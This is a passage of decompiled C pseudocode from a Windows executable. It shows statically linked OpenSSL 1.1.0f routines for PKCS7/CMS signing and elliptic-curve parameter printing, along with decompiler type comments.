  *(_QWORD *)(a5 + 40) = 0i64;
  return result;
}

//----- (000000014007F270) ----------------------------------------------------
__int64 __fastcall sub_14007F270(__int64 a1, unsigned int *a2)
{
  _DWORD *v2; // rdi
  int v4; // ebx
  __int64 v5; // rax
  int *v7; // rax

  v2 = *(_DWORD **)(a1 + 48);
  v4 = sub_140024EB0((__int64)a2);
  if ( sub_140021BD0((__int64)v2) )
  {
    v5 = sub_140021BD0((__int64)v2);
    return (sub_140024CF0(v5) & 0xF0007) == 65538;
  }
  else
  {
    if ( (unsigned int)sub_140024FD0(a2) == 44 )
    {
      v7 = (int *)sub_140055440();
    }
    else if ( v4 > 16 )
    {
      if ( v4 > 24 )
        v7 = (int *)sub_140059770();
      else
        v7 = (int *)sub_1400596B0();
    }
    else
    {
      v7 = (int *)sub_1400595E0();
    }
    return sub_14001C050(v2, v7, 0i64, 0i64, 0i64);
  }
}

//----- (000000014007F330) ----------------------------------------------------
__int64 __fastcall sub_14007F330(__int64 a1, _QWORD *a2)
{
  __int64 result; // rax

  if ( a2 )
  {
    result = *(_QWORD *)(a1 + 16);
    *a2 = result;
  }
  return result;
}

//----- (000000014007F340) ----------------------------------------------------
__int64 __fastcall sub_14007F340(_QWORD *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4)
{
  __int64 result; // rax

  if ( a2 )
  {
    result = a1[7];
    *a2 = result;
  }
  if ( a3 )
  {
    result = a1[2];
    *a3 = result;
  }
  if ( a4 )
  {
    result = a1[4];
    *a4 = result;
  }
  return result;
}

//----- (000000014007F370) ----------------------------------------------------
__int64 __fastcall sub_14007F370(__int64 a1, int a2, unsigned int a3)
{
  int v6; // eax
  int v7; // esi
  __int64 v8; // rax
  __int64 result; // rax
  int v10; // [rsp+20h] [rbp-18h]

  v6 = sub_14002C260(*(_QWORD *)(a1 + 24));
  v7 = a2 - 1;
  if ( v7 )
  {
    if ( v7 != 1 )
    {
      sub_140024610(33, 104, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_lib.c", 57);
      return 0i64;
    }
    if ( v6 == 22 )
    {
      v8 = *(_QWORD *)(a1 + 32);
      if ( v8 && *(_QWORD *)(*(_QWORD *)(v8 + 40) + 32i64) )
      {
        result = 0i64;
        *(_DWORD *)(a1 + 16) = 0;
      }
      else
      {
        result = 1i64;
        *(_DWORD *)(a1 + 16) = 1;
      }
      return result;
    }
    v10 = 51;
LABEL_16:
    sub_140024610(33, 104, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_lib.c", v10);
    return 0i64;
  }
  if ( v6 != 22 )
  {
    v10 = 37;
    goto LABEL_16;
  }
  *(_DWORD *)(a1 + 16) = a3;
  if ( a3 && (unsigned int)sub_14002C260(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 40i64) + 24i64)) == 21 )
  {
    sub_14004FD70(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 40i64) + 32i64));
    *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 40i64) + 32i64) = 0i64;
  }
  return a3;
}

//----- (000000014007F490) ----------------------------------------------------
__int64 __fastcall sub_14007F490(_QWORD *a1, __int64 a2)
{
  int v4; // eax
  int v5; // eax
  int v6; // eax
  _DWORD *v7; // r8

  v4 = sub_14002C260(*(_QWORD *)(a2 + 24)) - 21;
  if ( !v4 )
  {
    v7 = *(_DWORD **)(a2 + 32);
LABEL_11:
    if ( !v7 )
      return 0i64;
    goto LABEL_13;
  }
  v5 = v4 - 1;
  if ( !v5 )
  {
    v7 = *(_DWORD **)(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 40i64) + 32i64);
    goto LABEL_11;
  }
  v6 = v5 - 1;
  if ( !v6 )
  {
    v7 = *(_DWORD **)(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 16i64) + 16i64);
    if ( v7 )
      goto LABEL_13;
    v7 = sub_14004FEE0();
    *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 16i64) + 16i64) = v7;
    goto LABEL_11;
  }
  if ( v6 != 1 )
    return 0i64;
  v7 = *(_DWORD **)(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 40i64) + 16i64);
  if ( !v7 )
  {
    v7 = sub_14004FEE0();
    *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 40i64) + 16i64) = v7;
    goto LABEL_11;
  }
LABEL_13:
  v7[4] |= 0x10u;
  *a1 = v7 + 2;
  return 1i64;
}

//----- (000000014007F560) ----------------------------------------------------
__int64 __fastcall sub_14007F560(_QWORD *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _QWORD *a5)
{
  __int64 result; // rax

  if ( a2 )
  {
    result = a1[8];
    *a2 = result;
  }
  if ( a3 )
  {
    result = a1[7];
    *a3 = result;
  }
  if ( a4 )
  {
    result = a1[2];
    *a4 = result;
  }
  if ( a5 )
  {
    result = a1[4];
    *a5 = result;
  }
  return result;
}

//----- (000000014007F5A0) ----------------------------------------------------
__int64 __fastcall sub_14007F5A0(__int64 a1)
{
  return *(_QWORD *)(a1 + 80);
}

//----- (000000014007F5B0) ----------------------------------------------------
__int64 __fastcall sub_14007F5B0(__int64 a1)
{
  __int64 v1; // rdi
  __int64 *v3; // rcx
  unsigned int v4; // eax
  char *v5; // rax
  __int64 result; // rax
  int *v7; // r14
  BOOL v8; // ebp
  unsigned int *v9; // rax
  unsigned int *v10; // rsi
  __int16 v11; // dx
  __int16 v12; // r8
  unsigned __int8 *v13; // rax
  __int64 *v14; // rcx
  void *v15; // rax
  int v16; // [rsp+20h] [rbp-38h]
  unsigned __int8 *v17; // [rsp+60h] [rbp+8h] BYREF
  __int64 *v18; // [rsp+68h] [rbp+10h] BYREF
  size_t v19; // [rsp+70h] [rbp+18h] BYREF

  v1 = *(_QWORD *)(a1 + 72);
  v3 = *(__int64 **)(a1 + 16);
  v17 = 0i64;
  v4 = sub_14002C260(*v3);
  v5 = sub_14002C1A0(v4);
  result = sub_14001E990((__int64)v5);
  v7 = (int *)result;
  if ( result )
  {
    if ( (int)sub_1400B4130(a1, 0x34u, -1) < 0 )
    {
      v8 = 0;
      v9 = sub_1400B4060(0i64, 0);
      v10 = v9;
      if ( v9 )
        v8 = (int)sub_1400B4100(a1, 0x34u, v9[1], (char *)v9, -1) > 0;
      sub_1400AC200(v10);
      if ( !v8 )
      {
        v11 = 103;
        v16 = 396;
        v12 = 65;
LABEL_7:
        sub_140024610(46, v11, v12, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", v16);
        goto LABEL_8;
      }
    }
    v14 = *(__int64 **)(a1 + 80);
    if ( v14 )
    {
      v18 = *(__int64 **)(a1 + 80);
    }
    else
    {
      sub_14006E000(v1);
      if ( (int)sub_14006E290(v1, &v18, v7, 0i64, *(_QWORD *)(a1 + 64)) <= 0 )
        goto LABEL_8;
      v14 = v18;
    }
    if ( (int)sub_140020440(v14, -1, 8, 0xBu, 0, a1) <= 0 )
    {
      v16 = 663;
LABEL_16:
      v11 = 151;
      v12 = 110;
      goto LABEL_7;
    }
    v15 = sub_1400809E0();
    sub_1400536F0(*(unsigned int **)(a1 + 24), &v17, (__int64)v15);
    v13 = v17;
    if ( !v17 )
      goto LABEL_9;
    if ( (int)sub_14006DD90(v1) <= 0 || (int)sub_14006E0B0(v1, 0i64, &v19) <= 0 )
      goto LABEL_8;
    sub_14001D930(v17);
    v13 = (unsigned __int8 *)sub_14001D8E0(v19);
    v17 = v13;
    if ( !v13 )
      goto LABEL_9;
    if ( (int)sub_14006E0B0(v1, (__int64)v13, &v19) <= 0 )
    {
LABEL_8:
      v13 = v17;
LABEL_9:
      sub_14001D930(v13);
      sub_14006E000(v1);
      return 0i64;
    }
    if ( (int)sub_140020440(v18, -1, 8, 0xBu, 1u, a1) <= 0 )
    {
      v16 = 684;
      goto LABEL_16;
    }
    sub_14006E000(v1);
    sub_1400476D0(*(_QWORD *)(a1 + 40), (__int64)v17, v19);
    return 1i64;
  }
  return result;
}

//----- (000000014007F850) ----------------------------------------------------
__int64 __fastcall sub_14007F850(__int64 *a1, int *a2)
{
  __int64 v4; // rdi
  int v5; // ebx
  __int64 v6; // rax
  __int64 result; // rax

  if ( (unsigned int)sub_14002C260(*a1) == 22 )
  {
    v4 = a1[1];
    if ( v4 )
      v4 = *(_QWORD *)(v4 + 40);
  }
  else
  {
    sub_140024610(46, 133, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 26);
    v4 = 0i64;
  }
  v5 = 0;
  if ( (int)sub_1400296E0((unsigned int *)v4) <= 0 )
  {
LABEL_8:
    result = 1i64;
    *(_DWORD *)(*(_QWORD *)(a1[1] + 16) + 16i64) = 0;
  }
  else
  {
    while ( 1 )
    {
      v6 = sub_140029880(v4, v5);
      if ( !(unsigned int)sub_14007FA20((__int64)a1, v6, a2) )
        return 0i64;
      if ( ++v5 >= (int)sub_1400296E0((unsigned int *)v4) )
        goto LABEL_8;
    }
  }
  return result;
}

//----- (000000014007F920) ----------------------------------------------------
_QWORD *__fastcall sub_14007F920(__int64 *a1)
{
  _QWORD *v2; // rbx
  __int64 v4; // rsi
  int v5; // edi
  _QWORD *v6; // rax
  __int64 v7; // rax

  v2 = 0i64;
  if ( (unsigned int)sub_14002C260(*a1) == 22 )
  {
    v4 = a1[1];
    if ( v4 )
    {
      if ( *(_DWORD *)(*(_QWORD *)(v4 + 16) + 16i64) )
        sub_14007FDB0(v4);
      v5 = 0;
      if ( (int)sub_1400296E0(*(unsigned int **)(v4 + 8)) <= 0 )
      {
        return v2;
      }
      else
      {
        while ( 1 )
        {
          v6 = (_QWORD *)sub_140029880(*(_QWORD *)(v4 + 8), v5);
          v7 = sub_1400B29A0(v6);
          if ( !v7 )
            break;
          if ( v2 )
            sub_14002A140(v2, v7);
          else
            v2 = (_QWORD *)v7;
          if ( ++v5 >= (int)sub_1400296E0(*(unsigned int **)(v4 + 8)) )
            return v2;
        }
        sub_140029C60((__int64)v2);
        return 0i64;
      }
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    sub_140024610(46, 133, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 26);
    return 0i64;
  }
}

//----- (000000014007FA20) ----------------------------------------------------
__int64 __fastcall sub_14007FA20(__int64 a1, __int64 a2, int *a3)
{
  __int64 *v6; // rax
  unsigned int v7; // ebp
  __int64 *v8; // rsi
  __int64 *v9; // r14
  char *v11; // rdi
  void *v12; // rdi
  int v13; // r8d
  int v14; // eax
  void *v15; // rax
  unsigned int v16; // [rsp+30h] [rbp-88h] BYREF
  size_t v17; // [rsp+38h] [rbp-80h] BYREF
  char v18[64]; // [rsp+40h] [rbp-78h] BYREF

  v6 = (__int64 *)sub_14006DFD0();
  v7 = 0;
  v8 = v6;
  v9 = 0i64;
  if ( !v6 )
  {
    sub_140024610(46, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 541);
    return 0i64;
  }
  if ( *(_QWORD *)(a2 + 64) )
  {
    if ( !(unsigned int)sub_1400B28A0(v6, a3, *(_QWORD **)(a2 + 16))
      || *(_QWORD *)(a2 + 80) && !(unsigned int)sub_14007FD10(a2, 0) )
    {
      goto LABEL_29;
    }
    if ( (int)sub_1400B4150(a2) < 0 )
    {
      if ( *(_QWORD *)(a2 + 80) )
      {
        v9 = *(__int64 **)(a2 + 80);
        if ( !(unsigned int)sub_14006DA80(v8, (__int64)v18, &v16) )
          goto LABEL_29;
        v17 = (int)sub_14001D700(*(_QWORD *)(a2 + 64));
        v12 = sub_14001D8E0(v17);
        if ( !v12 )
        {
          sub_140024610(46, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 587);
          goto LABEL_29;
        }
        if ( (int)sub_140021070(v9, (__int64)v12, &v17, (__int64)v18, v16) <= 0 )
        {
          sub_14001D930(v12);
          goto LABEL_29;
        }
        v13 = v17;
      }
      else
      {
        v14 = sub_14001D700(*(_QWORD *)(a2 + 64));
        v15 = sub_14001D8E0(v14);
        v12 = v15;
        if ( !v15 )
        {
          sub_140024610(46, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 600);
          goto LABEL_29;
        }
        if ( !(unsigned int)sub_1400B3ED0(v8, (__int64)v15, &v16, *(_QWORD *)(a2 + 64)) )
        {
          sub_140024610(46, 150, 139, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 604);
          sub_14001D930(v12);
          goto LABEL_29;
        }
        v13 = v16;
      }
      sub_1400476D0(*(_QWORD *)(a2 + 40), (__int64)v12, v13);
    }
    else
    {
      v11 = **(char ***)(*(_QWORD *)(a1 + 8) + 16i64);
      if ( !(unsigned int)sub_14006DA80(v8, (__int64)v18, &v16)
        || !sub_1400B4100(a2, 0x33u, 4, v18, v16)
        || (int)sub_1400B4100(a2, 0x32u, 6, v11, -1) <= 0
        || !(unsigned int)sub_14007F5B0(a2) )
      {
        goto LABEL_29;
      }
    }
    v7 = 1;
    goto LABEL_29;
  }
  sub_140024610(46, 150, 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 546);
LABEL_29:
  sub_14006DF90(v8);
  sub_140020670(v9);
  return v7;
}

//----- (000000014007FD10) ----------------------------------------------------
__int64 __fastcall sub_14007FD10(__int64 a1, unsigned int a2)
{
  __int64 v2; // rax
  __int64 (__fastcall *v3)(_QWORD, __int64, _QWORD, __int64); // r10
  int v4; // eax

  v2 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 16i64);
  if ( !v2 )
    return 1i64;
  v3 = *(__int64 (__fastcall **)(_QWORD, __int64, _QWORD, __int64))(v2 + 176);
  if ( !v3 )
    return 1i64;
  v4 = v3(*(_QWORD *)(a1 + 64), 5i64, a2, a1);
  if ( v4 == -2 )
  {
    sub_140024610(46, 170, 125, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 210);
    return 0i64;
  }
  if ( v4 > 0 )
    return 1i64;
  sub_140024610(46, 170, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_sd.c", 214);
  return 0i64;
}

//----- (000000014007FDB0) ----------------------------------------------------
__int64 __fastcall sub_14007FDB0(__int64 a1)
{
  int v2; // esi
  int i; // edi
  int v4; // ecx
  int j; // edi
  __int64 result; // rax
  __int64 v7; // rax

  v2 = 0;
  for ( i = 0; i < (int)sub_1400296E0(*(unsigned int **)(a1 + 24)); ++i )
  {
    v4 = *(_DWORD *)sub_140029880(*(_QWORD *)(a1 + 24), i);
    if ( v4 == 4 )
    {
      if ( *(int *)a1 < 5 )
        *(_DWORD *)a1 = 5;
    }
    else if ( v4 == 3 )
    {
      if ( *(int *)a1 < 4 )
        *(_DWORD *)a1 = 4;
    }
    else if ( v4 == 2 && *(int *)a1 < 3 )
    {
      *(_DWORD *)a1 = 3;
    }
  }
  for ( j = 0; j < (int)sub_1400296E0(*(unsigned int **)(a1 + 32)); ++j )
  {
    if ( *(_DWORD *)sub_140029880(*(_QWORD *)(a1 + 32), j) == 1 && *(int *)a1 < 5 )
      *(_DWORD *)a1 = 5;
  }
  if ( (unsigned int)sub_14002C260(**(_QWORD **)(a1 + 16)) != 21 && *(int *)a1 < 3 )
    *(_DWORD *)a1 = 3;
  result = sub_1400296E0(*(unsigned int **)(a1 + 40));
  if ( (int)result > 0 )
  {
    do
    {
      v7 = sub_140029880(*(_QWORD *)(a1 + 40), v2);
      if ( **(_DWORD **)(v7 + 8) == 1 )
      {
        if ( *(int *)v7 < 3 )
          *(_DWORD *)v7 = 3;
        if ( *(int *)a1 < 3 )
          *(_DWORD *)a1 = 3;
      }
      else if ( *(int *)v7 < 1 )
      {
        *(_DWORD *)v7 = 1;
      }
      ++v2;
      result = sub_1400296E0(*(unsigned int **)(a1 + 40));
    }
    while ( v2 < (int)result );
  }
  if ( *(int *)a1 < 1 )
    *(_DWORD *)a1 = 1;
  return result;
}

//----- (000000014007FF00) ----------------------------------------------------
__int64 __fastcall sub_14007FF00(__int64 a1, __FrameHandler3::TryBlockMap *a2, int a3)
{
  __int16 v3; // ax
  unsigned int v4; // r14d
  __int16 v5; // bx
  __int64 v9; // r15
  _DWORD *v10; // r13
  _DWORD *v11; // r12
  _DWORD *v12; // rsi
  unsigned int v14; // eax
  int v15; // esi
  char *v16; // rax
  char *v17; // rsi
  int v18; // eax
  __int64 v19; // rax
  int v20; // eax
  struct _xDISPATCHER_CONTEXT *v21; // r15
  int v22; // r13d
  __int64 v23; // r15
  char *v24; // rax
  unsigned int v25; // esi
  char *v26; // rax
  const char *v27; // rdx
  const char *v28; // rdx
  int v29; // eax
  _DWORD *v30; // [rsp+30h] [rbp-78h]
  int *v31; // [rsp+38h] [rbp-70h]
  _DWORD *v32; // [rsp+40h] [rbp-68h]
  _DWORD *v33; // [rsp+48h] [rbp-60h]
  __int64 jumpbuf_sp; // [rsp+50h] [rbp-58h]
  __int64 v35; // [rsp+58h] [rbp-50h]
  __int64 v36; // [rsp+60h] [rbp-48h]
  unsigned int v37; // [rsp+B8h] [rbp+10h]
  _DWORD *v38; // [rsp+C8h] [rbp+20h]

  v4 = 0;
  v5 = v3 - 80;
  v32 = 0i64;
  v38 = 0i64;
  v33 = 0i64;
  v35 = 0i64;
  v9 = 0i64;
  v10 = 0i64;
  v11 = 0i64;
  if ( !a2 )
  {
    v5 = 67;
LABEL_3:
    v12 = 0i64;
    goto LABEL_4;
  }
  v31 = (int *)sub_140027CD0();
  v9 = (__int64)v31;
  if ( !v31 )
  {
    v5 = 65;
    goto LABEL_3;
  }
  if ( !(unsigned int)sub_140021A00((__int64)a2) )
  {
    v19 = sub_140021BD0((__int64)a2);
    v37 = sub_140022000(v19);
    v30 = sub_140027200();
    v10 = v30;
    if ( v30 )
    {
      v32 = sub_140027200();
      if ( v32 )
      {
        v38 = sub_140027200();
        if ( v38 )
        {
          v10 = v30;
          if ( v37 == 407 )
            v20 = sub_140021A60((__int64)a2);
          else
            v20 = sub_140021AB0((__int64)a2);
          if ( !v20 )
          {
            v11 = v32;
            v5 = 16;
            v12 = v38;
            goto LABEL_4;
          }
          v21 = __FrameHandler3::TryBlockMap::getpDC(a2);
          if ( !v21 || (jumpbuf_sp = _except_get_jumpbuf_sp(a2), v36 = sub_14001C740((__int64)a2), !jumpbuf_sp) )
          {
            v9 = (__int64)v31;
            v5 = 16;
            v11 = v32;
            v12 = v38;
            goto LABEL_4;
          }
          v22 = sub_140021B70((__int64)a2);
          v33 = (_DWORD *)sub_14001DE30((__int64)a2, v21, v22, 0i64, v31);
          if ( !v33 )
          {
            v5 = 16;
LABEL_30:
            v9 = (__int64)v31;
            v11 = v32;
            v12 = v38;
            v10 = v30;
            goto LABEL_4;
          }
          v23 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a2);
          if ( v23 )
            v35 = sub_140021B80((__int64)a2);
          if ( !(unsigned int)sub_140029E80(a1, a3, 128) )
            goto LABEL_30;
          v24 = sub_14002C1A0(v37);
          if ( (int)sub_14002A590(a1, "Field Type: %s\n", v24) <= 0 )
            goto LABEL_30;
          if ( v37 == 407 )
          {
            v25 = sub_140065450((__int64)a2);
            if ( !v25 )
              goto LABEL_30;
            if ( !(unsigned int)sub_140029E80(a1, a3, 128) )
              goto LABEL_30;
            v26 = sub_14002C1A0(v25);
            if ( (int)sub_14002A590(a1, "Basis Type: %s\n", v26) <= 0 )
              goto LABEL_30;
            v27 = "Polynomial:";
          }
          else
          {
            v27 = "Prime:";
          }
          if ( (unsigned int)sub_1400670C0(a1, v27, (__int64)v30, 0i64, a3) )
          {
            v11 = v32;
            v12 = v38;
            if ( !(unsigned int)sub_1400670C0(a1, "A:   ", (__int64)v32, 0i64, a3)
              || !(unsigned int)sub_1400670C0(a1, "B:   ", (__int64)v38, 0i64, a3) )
            {
              goto LABEL_59;
            }
            if ( v22 == 2 )
            {
              v28 = off_14013D000[0];
            }
            else
            {
              v28 = off_14013D008[0];
              if ( v22 != 4 )
                v28 = off_14013D010[0];
            }
            if ( (unsigned int)sub_1400670C0(a1, v28, (__int64)v33, 0i64, a3)
              && (unsigned int)sub_1400670C0(a1, "Order: ", jumpbuf_sp, 0i64, a3)
              && (!v36 || (unsigned int)sub_1400670C0(a1, "Cofactor: ", v36, 0i64, a3)) )
            {
              if ( !v23 )
              {
                v9 = (__int64)v31;
                v4 = 1;
                v10 = v30;
                goto LABEL_5;
              }
              v29 = sub_140080410(a1, "Seed:", v23, v35, a3);
              v9 = (__int64)v31;
              v10 = v30;
              if ( v29 )
              {
                v4 = 1;
                goto LABEL_5;
              }
            }
            else
            {
LABEL_59:
              v9 = (__int64)v31;
              v10 = v30;
            }
            goto LABEL_4;
          }
          goto LABEL_30;
        }
      }
      v10 = v30;
    }
    v11 = v32;
    v5 = 65;
    v12 = v38;
    goto LABEL_4;
  }
  if ( !(unsigned int)sub_140029E80(a1, a3, 128) )
    goto LABEL_3;
  v14 = sub_140021B00((__int64)a2);
  v15 = v14;
  if ( !v14 )
    goto LABEL_3;
  v16 = sub_14002C1A0(v14);
  if ( (int)sub_14002A590(a1, "ASN1 OID: %s", v16) <= 0 || (int)sub_14002A590(a1, "\n") <= 0 )
    goto LABEL_3;
  v17 = sub_140028820(v15);
  if ( !v17 )
  {
    v12 = 0i64;
    v4 = 1;
    goto LABEL_5;
  }
  if ( !(unsigned int)sub_140029E80(a1, a3, 128) )
    goto LABEL_3;
  v18 = sub_14002A590(a1, "NIST CURVE: %s\n", v17);
  v12 = 0i64;
  if ( v18 > 0 )
  {
    v4 = 1;
    goto LABEL_5;
  }
LABEL_4:
  sub_140024610(16, 149, v5, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\eck_prn.c", 228);
LABEL_5:
  sub_140026FF0(v10);
  sub_140026FF0(v11);
  sub_140026FF0(v12);
  sub_140026FF0(v33);
  sub_140027BE0(v9);
  return v4;
}
// 14007FF20: variable 'v3' is possibly undefined
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);
// 14013D000: using guessed type char *off_14013D000[4];
// 14013D008: using guessed type char *off_14013D008[3];
// 14013D010: using guessed type char *off_14013D010[2];

//----- (0000000140080410) ----------------------------------------------------
__int64 __fastcall sub_140080410(__int64 a1, const char *a2, __int64 a3, unsigned __int64 a4, int a5)
{
  unsigned int v10; // r14d
  signed int v11; // edi
  unsigned __int64 v12; // rbx
  const char *v13; // r9
  char v14[144]; // [rsp+20h] [rbp-E8h] BYREF

  if ( !a3 )
    return 1i64;
  v10 = 0;
  if ( a5 <= 0 )
  {
    v11 = 0;
  }
  else
  {
    v11 = 128;
    if ( a5 <= 128 )
      v11 = a5;
    memset(v14, 32, v11);
    if ( (int)sub_14002A430(a1, (__int64)v14, v11) <= 0 )
      return 0i64;
  }
  if ( (int)sub_14002A590(a1, "%s", a2) <= 0 )
    return 0i64;
  v12 = 0i64;
  if ( a4 )
  {
    while ( 1 )
    {
      if ( v12 == 15 * (v12 / 0xF) )
      {
        v14[0] = 10;
        memset(&v14[1], 32, v11 + 4);
        if ( (int)sub_14002A430(a1, (__int64)v14, v11 + 5) <= 0 )
          return 0i64;
      }
      v13 = (const char *)word_1400F6B40;
      if ( v12 + 1 == a4 )
        v13 = byte_1400D7DAE;
      if ( (int)sub_14002A590(a1, "%02x%s", *(unsigned __int8 *)(a3 + v12), v13) <= 0 )
        return 0i64;
      if ( ++v12 >= a4 )
        goto LABEL_17;
    }
  }
  else
  {
LABEL_17:
    LOBYTE(v10) = (int)sub_14002A430(a1, (__int64)"\n", 1u) > 0;
    return v10;
  }
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (00000001400805E0) ----------------------------------------------------
__int64 __fastcall sub_1400805E0(int a1, int **a2)
{
  int *v2; // rcx
  int v3; // eax
  __int64 v4; // rbx
  unsigned int v6; // r9d

  if ( a1 != 2 )
    return 1i64;
  v2 = *a2;
  v3 = **a2;
  switch ( v3 )
  {
    case 0:
      v4 = *((_QWORD *)v2 + 1);
      sub_14001D3C0(*(_QWORD *)(v4 + 40));
      sub_14005EE60(*(unsigned int **)(v4 + 32));
      sub_140020670(*(_QWORD **)(v4 + 48));
      return 1i64;
    case 2:
      v6 = 210;
LABEL_8:
      sub_14001DA40(
        *(void **)(*((_QWORD *)v2 + 1) + 32i64),
        *(_QWORD *)(*((_QWORD *)v2 + 1) + 40i64),
        (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_asn1.c",
        v6);
      return 1i64;
    case 3:
      v6 = 213;
      goto LABEL_8;
  }
  return 1i64;
}

//----- (0000000140080670) ----------------------------------------------------
void *sub_140080670()
{
  return &unk_14010FD10;
}

//----- (0000000140080680) ----------------------------------------------------
void *sub_140080680()
{
  return &unk_14010FF08;
}

//----- (0000000140080690) ----------------------------------------------------
_BOOL8 __fastcall sub_140080690(int a1, __int64 **a2, __int64 a3, __int64 a4)
{
  __int64 *v5; // rdi
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  _QWORD *v10; // rax

  if ( a2 )
  {
    v5 = *a2;
    v6 = a1 - 10;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( !v7 )
        goto LABEL_6;
      v8 = v7 - 1;
      if ( v8 )
      {
        if ( v8 == 1 )
        {
LABEL_6:
          if ( (int)sub_1400B24D0(v5, *(int **)(a4 + 8)) <= 0 )
            return 0i64;
        }
        return 1i64;
      }
    }
    else if ( (int)sub_1400B4170((_QWORD *)(a4 + 16), *a2) <= 0 )
    {
      return 0i64;
    }
    v10 = sub_1400B2660(v5, *(_QWORD *)a4);
    *(_QWORD *)(a4 + 8) = v10;
    return v10 != 0;
  }
  return 1i64;
}

//----- (0000000140080720) ----------------------------------------------------
void *sub_140080720()
{
  return &unk_1401100B0;
}

//----- (0000000140080730) ----------------------------------------------------
void *sub_140080730()
{
  return &unk_140110620;
}

//----- (0000000140080740) ----------------------------------------------------
void *sub_140080740()
{
  return &unk_1401102F0;
}

//----- (0000000140080750) ----------------------------------------------------
void *sub_140080750()
{
  return &unk_14010F9B0;
}

//----- (0000000140080760) ----------------------------------------------------
void *sub_140080760()
{
  return &unk_140110F90;
}

//----- (0000000140080770) ----------------------------------------------------
void *sub_140080770()
{
  return &unk_140110430;
}

//----- (0000000140080780) ----------------------------------------------------
void *sub_140080780()
{
  return &unk_14010FB30;
}

//----- (0000000140080790) ----------------------------------------------------
void *sub_140080790()
{
  return &unk_14010FBC0;
}

//----- (00000001400807A0) ----------------------------------------------------
void *sub_1400807A0()
{
  return &unk_14010FA80;
}

//----- (00000001400807B0) ----------------------------------------------------
void *sub_1400807B0()
{
  return &unk_140110EE0;
}

//----- (00000001400807C0) ----------------------------------------------------
void *sub_1400807C0()
{
  return &unk_140110DA0;
}

//----- (00000001400807D0) ----------------------------------------------------
void *sub_1400807D0()
{
  return &unk_1401109A0;
}

//----- (00000001400807E0) ----------------------------------------------------
void *sub_1400807E0()
{
  return &unk_140110C40;
}

//----- (00000001400807F0) ----------------------------------------------------
void *sub_1400807F0()
{
  return &unk_140110A10;
}

//----- (0000000140080800) ----------------------------------------------------
void *sub_140080800()
{
  return &unk_140110BD0;
}

//----- (0000000140080810) ----------------------------------------------------
void *sub_140080810()
{
  return &unk_140110AA0;
}

//----- (0000000140080820) ----------------------------------------------------
void *sub_140080820()
{
  return &unk_140110700;
}

//----- (0000000140080830) ----------------------------------------------------
void *sub_140080830()
{
  return &unk_1401107F0;
}

//----- (0000000140080840) ----------------------------------------------------
void *sub_140080840()
{
  return &unk_14010FDA0;
}

//----- (0000000140080850) ----------------------------------------------------
void *sub_140080850()
{
  return &unk_140110360;
}

//----- (0000000140080860) ----------------------------------------------------
void *sub_140080860()
{
  return &unk_1401104A0;
}

//----- (0000000140080870) ----------------------------------------------------
void *sub_140080870()
{
  return &unk_140110510;
}

//----- (0000000140080880) ----------------------------------------------------
__int64 __fastcall sub_140080880(int a1, __int64 *a2)
{
  __int64 v2; // rbx

  if ( a1 == 3 )
  {
    v2 = *a2;
    sub_14001D3C0(*(_QWORD *)(*a2 + 64));
    sub_14005EE60(*(unsigned int **)(v2 + 56));
    sub_14006DF90(*(void **)(v2 + 72));
  }
  return 1i64;
}

//----- (00000001400808D0) ----------------------------------------------------
void *sub_1400808D0()
{
  return &unk_140110690;
}

//----- (00000001400808E0) ----------------------------------------------------
void *sub_1400808E0()
{
  return &unk_140110860;
}

//----- (00000001400808F0) ----------------------------------------------------
void *sub_1400808F0()
{
  return &unk_1401108F0;
}

//----- (0000000140080900) ----------------------------------------------------
void *sub_140080900()
{
  return &unk_140110B10;
}

//----- (0000000140080910) ----------------------------------------------------
__int64 __fastcall sub_140080910(int a1, __int64 a2)
{
  if ( a1 == 3 )
    sub_14001D3C0(*(_QWORD *)(*(_QWORD *)a2 + 16i64));
  return 1i64;
}

//----- (0000000140080940) ----------------------------------------------------
void *sub_140080940()
{
  return &unk_140110CD0;
}

//----- (0000000140080950) ----------------------------------------------------
__int64 __fastcall sub_140080950(int a1, __int64 *a2)
{
  __int64 v2; // rbx
  __int64 result; // rax

  v2 = *a2;
  if ( a1 == 1 )
  {
    result = (__int64)sub_14001B520();
    *(_QWORD *)(v2 + 48) = result;
    if ( result )
    {
      sub_140024D60(result, 1);
      result = 1i64;
      *(_QWORD *)(v2 + 40) = 0i64;
    }
  }
  else
  {
    if ( a1 == 3 )
    {
